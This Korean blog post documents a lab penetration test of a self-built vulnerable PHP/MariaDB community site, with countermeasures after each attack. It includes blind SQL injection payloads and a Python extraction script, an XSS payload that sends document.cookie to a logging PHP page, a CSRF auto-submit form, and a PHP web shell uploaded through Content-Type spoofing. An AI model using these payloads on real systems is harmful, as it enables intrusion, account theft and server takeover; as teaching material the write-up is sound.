---
layout: post
title:  " 🔐 모의해킹 사이트 구축 & 웹 침투 테스트"
date:   2021-09-04 15:54:50 +0700
categories: "모의해킹"
tags: [ PHP, Mariadb, XSS, CSRF, Web Shell. Directory Listing, Blind SQL Injection]
description: 모의해킹 사이트를 통해 "
image: "https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2Fbw6sV1%2FbtrdXyoL4dZ%2F4ONeRfPX5ru7YKnRFLldik%2Fimg.png"
---
# 0. 목차
1. 개요<br>1.1 사이트 목적
2. 환경 구축
3. 웹 서비스 시작
4. 취약점 점검
<br>4.1 Blind SQL Injection
<br>4.2 XSS
<br>4.3 CSRF
<br>4.4 Web Shell
<br>4.5 Directory Listing
5. 프로젝트 결과
6. 참고자료

# 1. 개요
<mark>CIA 프로젝트</mark>
<br>프로젝트의 이름인 CIA는  보안의 3요소 (`기밀성, 무결성, 가용성`) 에서 가져왔다.  
CIA 프로젝트는 LAMP를 기반으로 웹 모의해킹 진단을 위하여 가상의 커뮤니티 사이트 `구축` 하여, 모의 침투 테스트를 통해 `취약점`를 진단합니다.

<!-- CIA Web Sites는 php, mariadb의 취약점을 고려해야 할 측면에 대해 설명합니다. -->
<hr>

## 1.1 사이트 목적

웹 사이트를 직접 `개발`하여 `취약한 코드`를 더 자세히 알 수 있으며,
<br>웹 개발에 취약점이 어디서 어떤 방식으로 취약점이 발생하는지 세밀하게 관찰하며, 관찰한 내용을 토대로 `점검`할 수 있습니다.

<hr>

# 2. 환경 구축

`LAMP` / `Centos7` `Apache/2.4.6` `5.5.68-MariaDB` `PHP 5.4.16`
<br>L: Linux (이번 wordpress는 CentOS 7에서 진행합니다.)
<br>A: Apache 웹 서버
<br>M: MySQL 또는 MariaDB
<br>P: PHP

<hr>

# 3. 웹 서비스 시작
<figure>
<img src="https://blog.kakaocdn.net/dn/bkruN7/btrdIT9gJ6b/xykMYzf4btPjli943XAaJ1/img.gif" alt="Weather API Web Sites">
<figcaption>Fig 1. Check app service</figcaption>
</figure>
<figure>
<img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2Fo67bb%2FbtrdK6fJvEZ%2FXx8OuQBTKafvh2biifknxk%2Fimg.png" alt="Weather API Web Sites - Main">
<figcaption>Fig 2. Main.</figcaption>
</figure>
<figure>
<img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2FckMpKL%2FbtrdKWqymEv%2F1zhejUXiCkITnzd3PgKm5k%2Fimg.png" alt="Weather API Web Sites - Main">
<figcaption>Fig 3. Login.</figcaption>
</figure>
<figure>
<img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2F0FIsA%2FbtrdHf59G0q%2FlpOiKb00MDe26eAchra7Kk%2Fimg.png" alt="Weather API Web Sites - Main">
<figcaption>Fig 4. Register.</figcaption>
</figure>
<figure>
<img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2FGi58T%2FbtrdOM1J3fH%2FkZ1ltqKFCVkKFFK8kx1a41%2Fimg.png" alt="Weather API Web Sites - Main">
<figcaption>Fig 5. MyPage.</figcaption>
</figure>
<figure>
<img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2FbAbeJB%2FbtrdHfSxI9c%2FXlgsK5dP2CB8FRy5DzPea1%2Fimg.png" alt="Weather API Web Sites - Main">
<figcaption>Fig 6. Board.</figcaption>
</figure>

<hr>

## 4. 취약점 점검

## 4-1 <sup id="sql">[[1]](#user-ref)</sup>Blind SQL Injection
1. 쿼리의 결과를 `참과 거짓`으로만 출력하는 페이지에서 사용하는 공격이다.
2. 출력 내용이 참 / 거짓 밖에 없어서 그것을 이용하여 데이터베이스의 내용을 추측하여 `쿼리를 조작`한다.

<figure>
<img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2Fx1H93%2FbtqG9ST9EIX%2FX85GJhTbLbt2mkNoXKDm90%2Fimg.png
" alt="Weather API Web Sites - Main">
<figcaption>Fig 1. 공격 흐름도</figcaption>
</figure>


저는 Blind SQL Injection 중에서 <sup id="based">[[2]](#user-ref2)</sup>`Bollean Based`를 이용하여 게시판에서 공격해보도록 하겠습니다. 

<figure>
<img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2FcCuU4T%2FbtrdINH8TL7%2F9gSyq4SRaKNwAxpPcouqTk%2Fimg.png
" alt="Weather API Web Sites - Main">
<figcaption>Fig 2. 게시판 (1/3)</figcaption>
</figure>

<figure>
<img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2FnZapi%2FbtrdIUgmVE2%2FfkKFHR0HCd892bXtCJGKyK%2Fimg.png
" alt="Weather API Web Sites - Main">
<figcaption>Fig 3. 게시판 - 검색 (2/3)</figcaption>
</figure>

<figure>
<img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2FcxfDqV%2FbtrdJ4v5chs%2FxECzsjawEDzK2EWitiJle0%2Fimg.png
" alt="Weather API Web Sites - Main">
<figcaption>Fig 4. 게시판 - 쿼리로그 (3/3)</figcaption>
</figure>

<figure>
<div class="overflow-table" markdown="block">

|      종류                | 주석                               |
| :---------------------- | :--------------------------------- |
| `MySQL` | `#` |
| `MSSQL, Oracle, Sabase ASE, DB2`           | `--`               |
| `MariaDB`           | `--, #`       |
| `Sybase IQ`           | `--, //, %`       

</div>
<figcaption>쿼리 공격을 위한 주석 테이블</figcaption>
</figure>

```sql
$ select * from board where title like '%2 'or 1=1#%' order by idx desc
$ 2 'or 1=1#
```
<figcaption>Boolean Based Sql - 취약점 확인</figcaption>

전 위의 주석 및 취약점 확인 방식을 이용하여 `쿼리 공격` 구문이 항상 참이 되게 하여 공격이 먹히는지 확인해보도록 하겠습니다.

<figure>
<img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2FW4D69%2FbtrdPJqu6pN%2FKdIpyMCE0SpiE9yKYpU3u0%2Fimg.png
" alt="Weather API Web Sites - Main">
<figcaption>Fig 5. 게시판 공격 확인 (1/3)</figcaption>
</figure>
_________________________________________________
<figure>
<img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2Fo2i2K%2FbtrdMKqrgVx%2F6VyJYyFf8oKD3g4J3A7IBK%2Fimg.png
" alt="Weather API Web Sites - Main">
<figcaption>Fig 5. 게시판 공격 확인 (2/3)</figcaption>
</figure>

<figure>
<img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2FbnIjvs%2FbtrdJjUFuoJ%2FVDwqlSqNRLYwqzaIhZIFvK%2Fimg.png
" alt="Weather API Web Sites - Main">
<figcaption>Fig 6. 게시판 -공격 확인 (3/3)</figcaption>
</figure>

쿼리 공격구문이 성공하여 `항상 참`이 되는 `결과값`을 볼 수 있었습니다.
그래서 저는 아래 방식으로 `데이터베이스 이름`, `테이블 이름`, `테이블의 컬럼` 등등를 가져왔습니다.
<br>
<figure>
<div class="overflow-table" markdown="block">

|      종류                | 공격 구문                               |
| :---------------------- | :--------------------------------- |
| `데이터베이스 길이` | `1' and length(database()) > 2#` |
| `데이터베이스 이름`           | `1' and substring(database(),1,1)='c'#, 1' and substring(database(),2,1)='i'#`               |
| `CIA 데이터베이스 테이블 길이`           | `1' and length((select table_name from information_schema.tables where table_type='base table' and table_schema='CIA' limit 0,1))=5#, 1' and length((select table_name from information_schema.tables where table_type='base table' and table_schema='CIA' limit 1,1))=10#`       |
| `CIA 데이터베이스 테이블 이름`           | `1' and (select table_name from information_schema.tables where table_type='base table' and table_schema='CIA' limit 0, 1) = 'board'#,1' and substring((select table_name from information_schema.tables where table_type='base table' and table_schema='CIA' limit 0,1),1,1) = 'b'#, 1' and (select table_name from information_schema.tables where table_type='base table' and table_schema='CIA' limit 2, 1) = 'member'#`
| `CIA 데이터베이스 테이블 컬럼 길이`           | `1' and length((select column_name from information_schema.columns where table_name='member' limit 0,1))=3#, 1' and length((select column_name from information_schema.columns where table_name='member' limit 1,1))=2#`
| `CIA 데이터베이스 테이블 컬럼 이름`           | `1' and substring((select column_name from information_schema.columns where table_name='member' limit 0,1),1,1) = 'i'#, 1' and substring((select column_name from information_schema.columns where table_name='member' limit 0,1),2,1) = 'd'#`
| `아이디 가져오기`           | `1' and (select idx from member where id='veloideu')#, 1' and (select id from member limit 6,1)='qwe'#`
| `패스워드 길이 가져오기`           | `1' and length((select pw from member where id='veloideu'))=60#`
| `패스워드 암호화 방식 확인`           | `1' and sha1("123")=(select pw from member where id='veloideu')#`

</div>
<figcaption>쿼리 공격을 위한 공격 구문 테이블</figcaption>
</figure>

```python
import requests
from bs4 import BeautifulSoup
import string

comparison = string.ascii_lowercase

db_name ="    DB 이름 : "
table_name =" Table 이름 : "
Column_name ="Column 이름 : "
Member_name ="Member 이름 : "

for b in range(1, 4): # DB 이름 : 1' and substring(database(),{b},1)='{i}'%23
    for i in comparison:
        url = f"http://192.168.35.237/page/board/search_result.php?catgo=title&search=1' and substring(database(),{b},1)='{i}'%23"
        response = requests.get(url)
        response_text = response.text
        soup = BeautifulSoup(response_text, 'html.parser')
        title = soup.select_one('#board_area > table > tbody > tr > td:nth-child(2) > a > span:nth-child(1)')

        if title != None:
            db_name += i
        else :
            pass

for a in range(1, 6): # Table 이름 : 1' and substring((select table_name from information_schema.tables where table_type='base table' and table_schema='CIA' limit 0,1),{a},1) = '{b}'%23
    for b in comparison:

        url = f"http://192.168.35.237/page/board/search_result.php?catgo=title&search=1' and substring((select table_name from information_schema.tables where table_type='base table' and table_schema='CIA' limit 0,1),{a},1) = '{b}'%23"
        response = requests.get(url)
        response_text = response.text
        soup = BeautifulSoup(response_text, 'html.parser')
        title = soup.select_one('#board_area > table > tbody > tr > td:nth-child(2) > a > span:nth-child(1)')

        if title != None:
            table_name += b
        else :
            pass

for a in range(1, 3):
    for b in comparison: # Column 이름 : 1' and substring((select column_name from information_schema.columns where table_name='member' limit 1,1),{a},1) = '{b}'%23

        url = f"http://192.168.35.237/page/board/search_result.php?catgo=title&search=1' and substring((select column_name from information_schema.columns where table_name='member' limit 1,1),{a},1) = '{b}'%23"
        response = requests.get(url)
        response_text = response.text
        soup = BeautifulSoup(response_text, 'html.parser')
        title = soup.select_one('#board_area > table > tbody > tr > td:nth-child(2) > a > span:nth-child(1)')

        if title != None:
            Column_name += b
        else :
            pass

for a in range(1, 6):
    for b in comparison: # Member 이름 : ' and substring((select id from member limit 1,1),{a},1)='{b}'%23"

        url = f"http://192.168.35.237/page/board/search_result.php?catgo=title&search=1' and substring((select id from member limit 1,1),{a},1)='{b}'%23"
        response = requests.get(url)
        response_text = response.text
        soup = BeautifulSoup(response_text, 'html.parser')
        title = soup.select_one('#board_area > table > tbody > tr > td:nth-child(2) > a > span:nth-child(1)')

        if title != None:
            Member_name += b
        else :
            pass


print(db_name)
print(table_name)
print(Column_name)
print(Member_name)
```
<figcaption>Fig 7. 쿼리 공격 스크립트 (1/3)</figcaption>
<figure>
<img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2FbybK40%2FbtrdPJTgRVU%2Fs9GCSyvkkn8qAjhOVye32K%2Fimg.png
" alt="Weather API Web Sites - Main">
<figcaption>Fig 8. 쿼리 공격 스크립트 (2/3)</figcaption>
</figure>
<figure>
<img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2FbXLWXs%2FbtrdPItm9Cx%2FMikd0xUGgLSJYMKa82b8ik%2Fimg.png
" alt="Weather API Web Sites - Main">
<figcaption>Fig 9. 쿼리 공격 스크립트 (3/3)</figcaption>
</figure>

저는 시간을 단축하기 위해 위의 7~9번 사진처럼 공격 스크립트 `파이썬`을 이용하여 작성 후 공격하여 `원하는 결과값`을 얻을 수 있엇습니다.

#### 대응 방안
현재 공격이 가능한 부분은 게시판 검색이 가능한 부분 및 `SQL 공격 구문이` 가능한 부분입니다.
<br>게시판에서 검색을 할때 `입력값의 유효성 검사`를 안해서 `Bollean Based 공격`이 되고 있습니다.
<br>이를 보안하기 위해서는 DBMS 종류에 따라 `쿼리의 구조`를 `변경`시키거나, 쿼리문의 일부로 사용되는 문자를 `공백` 등으로 `치환`하는 방식으로 방어를 하면 됩니다.
(`특수문자:', =, #, -- / 공격 구문에 사용된 database, select 등등`)

<br>


 <hr>
## 4-2 <sup id="xss">[[3]](#user-ref3)</sup> `XSS` `: Cross Site Scripting`

 1. 사이트를 `교차`해서 스크립트를 발생시킴.
 2. 게시판을 포함한 웹에서 `자바스크립트`같은 스크립트 언어를 삽입해 개발자가 의도하지 않은 기능을 작동시키는것.
 3. `클라이언트측`을 대상으로 한 공격

전 여기서 `Stored XSS` (웹 사이트 `게시판`에 스크립트를 `삽입`하는 공격 방식)를 이용해보도록 하겠습니다.

<figure>
<img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2Fb3uWBk%2FbtrdT1MevqC%2FAy2bksolFQoHa6cPfYcnkK%2Fimg.png
" alt="Weather API Web Sites - Main">
<figcaption>Fig 10. XSS 게시판 테스트 (1/4)</figcaption>
</figure>

<figure>
<img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2FmZVZt%2FbtrdVjr5UXJ%2FcQCJOVYYJICHXUZ3Pdekk0%2Fimg.png
" alt="Weather API Web Sites - Main">
<figcaption>Fig 11. XSS 게시판 테스트 (2/4)</figcaption>
</figure>

<figure>
<img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2FbBKi3M%2FbtrdXxwDCZe%2FxzYIAUg3RR2nHzR3kclFUK%2Fimg.png
" alt="Weather API Web Sites - Main">
<figcaption>Fig 12. XSS 게시판 테스트 (3/4)</figcaption>
</figure>

<figure>
<img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2F6BdJD%2FbtrdPJFN1Df%2F1k97aP2ciiQ5KkhoUlqQsk%2Fimg.png
" alt="Weather API Web Sites - Main">
<figcaption>Fig 13. XSS 게시판 테스트 (4/4)</figcaption>
</figure>

```javascript
$ <script>alert("내용 ")</script>
```
<figcaption>Javascript를 이용한 XSS 취약점 확인 코드</figcaption>
XSS 공격이 가능한것이 확인이 되어, 전 XSS 공격으로 `쿠키값`을 `탈취`해보도록 하겠습니다.
<br>
<br>
```javascript
<script>window.open("http://192.168.35.237/xss/cookie.php?data="+document.cookie)</script>
```
<figcaption>XSS 공격 코드 (1/2)</figcaption>

```php
<?php
	$cookie=$_GET['data'];
	$atime=date("y-m-d H:i:s");
	$log=fopen("data.txt","a");
	fwrite($log, $atime." ".$cookie."\r\n");
	fclose($log);
	echo "<img src=hacker.png></img>";
?>
```
<figcaption>XSS 공격 코드 (2/2)</figcaption>

<figure>
<img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2FmZVZt%2FbtrdVjr5UXJ%2FcQCJOVYYJICHXUZ3Pdekk0%2Fimg.png
" alt="Weather API Web Sites - Main">
<figcaption>Fig 14. XSS를 이용한 쿠키 값 탈취 (1/4)</figcaption>
</figure>

<figure>
<img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2Fbw6sV1%2FbtrdXyoL4dZ%2F4ONeRfPX5ru7YKnRFLldik%2Fimg.png
" alt="Weather API Web Sites - Main">
<figcaption>Fig 15. XSS를 이용한 쿠키 값 탈취 (2/4)</figcaption>
</figure>

<figure>
<img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2FkIJG0%2FbtrdVOFoSlq%2FD6rOTBvXMimWLCog6FAjUk%2Fimg.png
" alt="Weather API Web Sites - Main">
<figcaption>Fig 16. XSS를 이용한 쿠키 값 탈취  (3/4)</figcaption>
</figure>

<figure>
<img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2FbjtDK9%2FbtrdOWFuPWh%2FkPFff5I2EmArUEwgNNGVC0%2Fimg.png
" alt="Weather API Web Sites - Main">
<figcaption>Fig 17. XSS를 이용한 쿠키 값 탈취 (4/4)</figcaption>
</figure>

게시글을 읽는 사람은 `해커`의 웹 서버에 `cookie.php`를 읽고 `쿠키값이 탈취` 되며, 사진 창이 띄어지도록 하였고, `fopen`을 통하여 해커 `data.txt`에 시간, 쿠키값을 `저장`하도록 하였습니다.
<br>
#### 대응 방안
현재 공격이 가능한 부분은 게시판에서 `글을 쓸때, 댓글을 쓸때`XSS공격이 가능합니다.
<br>XSS 공격이 가능함에 따라 Stored XSS를 이용하여 `사용자의 쿠키값이 노출`되고 있습니다.
<br>이러한 상황을 방어하기 위해서는 `유효성 검사`를 통해 <script 태그, 태그 문자(<,>,",')를 `이스케이핑` 한다.
<br>(`태그문자 : <(&lt), >(&gt), "(&quot), '(&apos), &(&amp) 등등`)

<hr>
## 4-3 <sup id="csrf">[[4]](#user-ref4)</sup> `CSRF` `: Cross Site Request Forgery`

1. XSS와 `동일한 원리`로 게시판, 이메일 등 컨텐츠에 `악성 스크립트` 또는 HTML 태그 삽입
2. 사용자 측 브라우저에서 `삽입된 스크립트` 또는 HTML 태그가 실행됨
3. 공격자가 의도한 행위(CRUD)가 있는 위조된 HTTP 요청이 `강제로 수행`됨

이번에도 `게시판`을 통해 `CSRF` 공격이 가능한지 확인해보겠습니다.

<br>

<figure>
<img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2FbxVhRr%2FbtrdVPlGK5Z%2FG59Lv2gPNdTIIkPTyglQpk%2Fimg.png
" alt="Weather API Web Sites - Main">
<figcaption>Fig 18. 게시글 패킷 분석 (1/3)</figcaption>
</figure>
<figure>
<img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2F15Zjf%2Fbtrd0XQw9r0%2FJtuLiwvfqqTBOOtY587gkK%2Fimg.png
" alt="Weather API Web Sites - Main">
<figcaption>Fig 19. 게시글 패킷 분석 (2/3)</figcaption>
</figure>
<figure>
<img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2FsaO9N%2FbtrdU7fQQUU%2FVTQ6Aj0CaiHgdslA9sTL3K%2Fimg.png
" alt="Weather API Web Sites - Main">
<figcaption>Fig 20. 게시글 패킷 분석 (3/3)</figcaption>
</figure>
<figure>
<img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2FrQLTg%2Fbtrd1PYL6CG%2FlK74dFguapKV2iHcnq6GGK%2Fimg.png
" alt="Weather API Web Sites - Main">
<figcaption>Fig 21. CSRF 공격 (1/5)</figcaption>
</figure>
<figure>
<img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2FdEShRj%2Fbtrd0FP2nhS%2FDKe5Ym570B6kmEXkyCJgZ1%2Fimg.png
" alt="Weather API Web Sites - Main">
<figcaption>Fig 22. CSRF 공격 (2/5)</figcaption>
</figure>

<figure>
<img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2FbTqeo6%2FbtrdZWY3t4y%2Fh8vhOpqTHDNuqqEaxFKrr1%2Fimg.png
" alt="Weather API Web Sites - Main">
<figcaption>Fig 23. CSRF 공격 (3/5)</figcaption>
</figure>

<figure>
<img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2FnjcZj%2Fbtrd0j7DLvl%2F9l6bh7yhypvQneq2pgAYU0%2Fimg.png
" alt="Weather API Web Sites - Main">
<figcaption>Fig 24. CSRF 공격 (4/5)</figcaption>
</figure>


<figure>
<img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2Fcfzeit%2Fbtrd0yQ1pbK%2FprkYS2kdkltrIsvTN8xX0K%2Fimg.png
" alt="Weather API Web Sites - Main">
<figcaption>Fig 25. CSRF 공격 (5/5)</figcaption>
</figure>

```php
<form name="write_form" action="write_ok.php" method="post" enctype="multipart/form-data" target="A">
<input type="hidden" name="title" value="CSRF 자동 글"> 
<input type="hidden" name="content" value="test">
<input type="hidden" name="lockpost" value="1" >
<input type="file" name="imgFile" style="display:none;"> 
</form>
<iframe name="A" style="display:none;"></iframe> 
<script>document.write_form.submit();</script>
```
<figcaption>CSRF 공격 코드</figcaption>

정상적인 게시글을 작성 후 <sup id="fiddler">[[5]](#user-ref5)</sup>`fiddler`로 글쓰기가 어떠한 방식으로 작성이 되었는지 <br><sup id="sniffing">[[6]](#user-ref6)</sup>`스니핑` 한 후 탈취한 `파라미터와 변수`를 위에 CSRF 공격 코드처럼 양식을 맞추어 작성 후 게시글을 등록합니다. 그다음 다른 계정으로 작성한 게시글(CSRF를 코드가 주입된 게시글)를 읽으면 사이트 간 `요청 위조`를 하였기 때문에 내가 작성한 글이 아님에도 해커에 의해서 `의도치 않은` 글을 작성하게 됩니다. (* input type="file"은 hidden이 안먹히므로 style에 따로 display:none;를 이용하여 스타일링 해주었습니다.)

#### 대응 방안
현재 공격이 가능한 부분은 XSS와 동일하게 게시판에서 글을 쓸때, 댓글을 쓸때 CSRF공격이 가능합니다. <br> CSRF 공격이 가능함에 따라 `해커`에 의해서 `의도치 않은 글`을 `작성`하게 되었습니다.
<br> 이러한 상황을 방어하기 위해서는 XSS와 동일하게 `유효성 검사` <script태그, 태그 문자(<,>,",')를 `이스케이핑` 합니다.
"태그문자 : <(&lt), >(&gt), "(&quot), '(&apos), &(&amp) 등등" 
<br>추가적으로 백엔드 부분에서 `Request`의 `Referer`를 확인하여 Domain(192.168.35.237)가 일치하는지 검증합니다.

<br>

<hr>
## 4-4 <sup id="webshell">[[7]](#user-ref7)</sup> `Web Shell`

1. 웹쉘은 말 그대로 웹사이트를 통해 `쉘(shell)을 여는 공격` 입니다.
2. 원격에서 웹서버에 `명령을 수행`할 수 있도록 작성한 웹 스크립트 (ASP, JSP, PHP, CGI 파일 등) 형태를 가짐
3. 웹 서버의 다양한 취약점 (`서버 취약점, 웹 어플리케이션 취약점`) 등을 타깃으로 공격하여 웹 서버에 웹쉘을 업로드한 후<br>일반적인 웹 브라우저 (80 Port)를 통하여 업로드한 웹쉘을 실행하여 침투한 서버상의 `정보 유출 및 변조, 악성코드 유포` 등의 불법 행위를 행하는 형태가 많음

이번에도 `게시판`을 통해 `Web Shell` 공격이 가능한지 확인해보겠습니다.

<figure>
<img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2FbWJyh1%2Fbtrd22XMdp5%2FWy6ByH8wcJu8usZFOuTv51%2Fimg.png
" alt="Weather API Web Sites - Main">
<figcaption>Fig 26. 파일 업로드 확인 (1/3)</figcaption>
</figure>

<figure>
<img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2FdmXSiq%2Fbtrd1zvgbKa%2Fu7s5Y4W1tBbNHSgTGwW3MK%2Fimg.png" alt="Weather API Web Sites - Main">
<figcaption>Fig 27. 파일 업로드 확인 (2/3)</figcaption>
</figure>

<figure>
<img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2FbyiLcF%2FbtrdZWdTA6i%2F3yOPDs2Uh73O2gMcDniAjK%2Fimg.png" alt="Weather API Web Sites - Main">
<figcaption>Fig 28. 파일 업로드 확인 (3/3)</figcaption>
</figure>

<figure>
<img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2F27sNp%2Fbtrd14IxI5t%2FAL9Wkve4Pp1Cwoez5Qvpjk%2Fimg.png" alt="Weather API Web Sites - Main">
<figcaption>Fig 29. Web Sehll 공격 (1/7)</figcaption>
</figure>

<figure>
<img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2FbdQKS8%2FbtrdZVst5GP%2FkTMGb8EDpXYPOXKScnpgNk%2Fimg.png" alt="Weather API Web Sites - Main">
<figcaption>Fig 30. Web Sehll 공격 (2/7)</figcaption>
</figure>

<figure>
<img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2FclHe3H%2Fbtrd1xRKaoj%2FekxHDOk9M0FipXv9bA1KVK%2Fimg.png" alt="Weather API Web Sites - Main">
<figcaption>Fig 31.Web Sehll 공격 (3/7)</figcaption>
</figure>

<figure>
<img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2FZquWV%2Fbtrd2yQaBaP%2FaXvtPCtTfJNvuwMnzqgv01%2Fimg.png" alt="Weather API Web Sites - Main">
<figcaption>Fig 32. Web Sehll 공격 (4/7)</figcaption>
</figure>

<figure>
<img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2FzwmyJ%2Fbtrd0jzVjP6%2F9yEUEVUT3c1cS5giEhUqzk%2Fimg.png" alt="Weather API Web Sites - Main">
<figcaption>Fig 33. Web Sehll 공격 (5/7)</figcaption>
</figure>

<figure>
<img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2Fcmb0J4%2Fbtrd0ywQElW%2FAl7yg7nDOOB7eushxfECXK%2Fimg.png" alt="Weather API Web Sites - Main">
<figcaption>Fig 34. Web Sehll 공격 (6/7)</figcaption>
</figure>

<figure>
<img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2FcDhOXg%2Fbtrd0jmmgyR%2Fa5C9dRTM6S0y0KJmHUqeFK%2Fimg.png" alt="Weather API Web Sites - Main">
<figcaption>Fig 35. Web Sehll 공격 (7/7)</figcaption>
</figure>

```php
<?php
//
// PoC: a simple webshell 
// Author: Bonghwan Choi
//

echo 'Enter a Command:<br>';
echo '<form action="">';
echo '<input type=text name="cmd">';
echo '<input type="submit">';
echo '</form>';

if (isset($_GET['cmd'])) {
	system($_GET['cmd']);
}
?>
```
<figcaption>Web Shell 공격 코드</figcaption>

현재 `파일 업로드`를 통해 `Web Shell`이 이루어지고 있다.
<br>정상적인 파일업로드라면 `이미지 확장`(png, jpg, bmp등)만 이루어지게 되어 있거나, `블랙리스트 기반 파일 확장자`(php, asp, jsp)는 `필터링`이 되어있다. 
<br>전 여기서 공격을 하기 위해 피들러를 이용하여 `요청`(Request) `변조하여 Content-type를 우회`해서 
Content-Type:application/x-php가 아닌 `Content-Type:image/jpeg`로 속여 업로드를 한 후 미리 작성해둔 Web Shell 공격코드를 통해 (etc/passwd)등의 `시스템 파일`등등 `접근 시도`가 가능합니다.

#### 대응 방안
현재 공격이 가능한 부분은 글을 쓸때 업로드 부분에서 웹쉘 공격이 가능합니다.
<br>웹쉘 공격이 가능함에 따라 `시스템 파일에 접근`이 가능하였습니다.
<br>현재 서버측에서 `이미지 검사`를 하지만 `콘텐트타입`만 검사하고, 파일명 및 파일내용등 `정확한 검증`을 하지 않아 발생한 취약점 입니다.
<br>이러한 경우를 보안 하기 위해서는 `파일내용(http body 내용), 파일명`등 정확한 검증을 하여야 합니다.
<br><br>추가적으로  `이미지 파일에 존재`하는 `php code`가 실행되지 않도록 설정하고, php에서 지원하는 `함수` 기능을 `허용하지 않는 옵션에 (disable_functions = system, exec, shell_exec)`를 적어주도록 합니다.
<br> 그리고 php 에서 `원격지`에 있는 `파일을 읽어`오지 못하도록 allow_url_fopen = Off 설정을 해줍니다.
<br>
<hr>
## 4-5 `Directory Listing`

1. 디렉토리 리스팅이란 웹서버를 `디렉토리`로 `접속`할 때, 해당 디렉토리내의 `파일과 디렉토리`를 `리스트`로 보여주는 기능을 말합니다.
2. 디렉터리 리스팅 취약점은 `브라우징 하는 모든 파일`을 보여준다. 
